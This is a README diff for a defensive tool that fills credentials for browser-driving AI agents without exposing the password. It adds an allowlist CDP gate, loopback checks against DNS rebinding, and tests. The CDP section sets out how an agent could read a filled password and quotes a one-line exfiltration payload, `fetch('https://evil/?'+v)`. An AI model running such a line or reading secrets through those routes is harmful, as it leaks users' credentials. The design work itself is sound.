@@ -3,10 +3,12 @@
 Governed credential fill for AI agents. The agent drives the browser; it never
 sees the password.
 
-> **Status: v0.1, private.** The `VaultBackend` trait, `SecretHandle` and the
-> saas driver are in. The CDP allowlist proxy, MCP surface and community driver
-> are not yet — see [Roadmap](#roadmap). This repository goes public only after
-> the adversarial suite is green on every shipped driver.
+> **Status: v0.1, private.** In: the `VaultBackend` trait, `SecretHandle`, the
+> saas driver, the CDP allowlist gate and the loopback checks. Not yet: the
+> Chromium transport those two policies plug into (pipe attach, proxy socket),
+> the MCP surface, and the community driver — see [Roadmap](#roadmap). This
+> repository goes public only after the adversarial suite is green on every
+> shipped driver.
 
 ## The invariant
 
@@ -45,8 +47,35 @@ packages/protocol   wire types shared with the (closed) vault handlers
 packages/browser-bridge
   secret-handle.ts  the invariant, as a class
   vault-backend.ts  the trait every driver implements + capability→tool map
+  cdp-policy.ts     what an agent's CDP connection may do
+  loopback.ts       who may reach the local listeners
   drivers/saas.ts   1Claw-hosted backend
 ```
+
+### CDP ownership
+
+The bridge is the **only** process attached to Chromium; frameworks reach it
+through a gate. If an agent keeps its own CDP connection to the same browser
+the bridge types into, the invariant fails in one step — after a fill it reads
+`input.value`, the a11y tree, a screenshot, or the `Network` log of the POST.
+
+Filtering responses does not fix that, which is why this gates commands and
+events rather than redacting: `btoa(input.value)` and
+`fetch('https://evil/?'+v)` never return the value to the agent at all.
+
+It is an **allowlist**. CDP has ~50 domains and gains members every Chromium
+release; a denylist is stale the day it is written, and its failure mode is
+silent exposure. During a fill the *whole target* is blocked, not just the
+field, and push events on it are dropped rather than queued — replaying them
+afterwards would hand over exactly what suppression prevented.
+
+### Loopback
+
+`127.0.0.1` is not a boundary: every page in the browser being driven can reach
+it. Any request carrying an `Origin` is refused — not just cross-site ones,
+because localhost-to-localhost is *same*-site and `Sec-Fetch-Site` would pass
+it. Plus a literal-loopback `Host` check for DNS rebinding, and a per-session
+token compared in constant time.
 
 ### Capability gating
 
@@ -63,13 +92,15 @@ pnpm test          # vitest
 pnpm ci            # both, as CI runs them
 ```
 
-The suite includes mutation-verified guards: making `toJSON` return plaintext,
-removing the buffer zeroing, or adding `if (backend === "saas")` to the core
-each fail a specific test.
+The suite includes mutation-verified guards. Each of these fails a specific
+test rather than passing quietly: making `toJSON` return plaintext, removing
+the buffer zeroing, adding `if (backend === "saas")` to the core, letting the
+CDP gate allow unknown methods, not blocking the target during a fill, and
+rejecting only cross-site `Origin`s.
 
 ## Roadmap
 
-- **v0.1** (here) — `VaultBackend` + `SecretHandle` + saas driver → CDP allowlist proxy, MCP stdio, vault handlers
+- **v0.1** (here) — `VaultBackend` + `SecretHandle` + saas driver + CDP allowlist gate + loopback checks → Chromium pipe transport, per-client `BrowserContext`, MCP stdio, vault handlers
 - **OSS launch** — community driver, form action + fingerprint checks, adversarial harness, mock-vault
 - **v0.2** — governed credential registration, HITL approval queue, TOTP fill
 - **v0.3** — cloud-runtime sidecar (platform trust model)
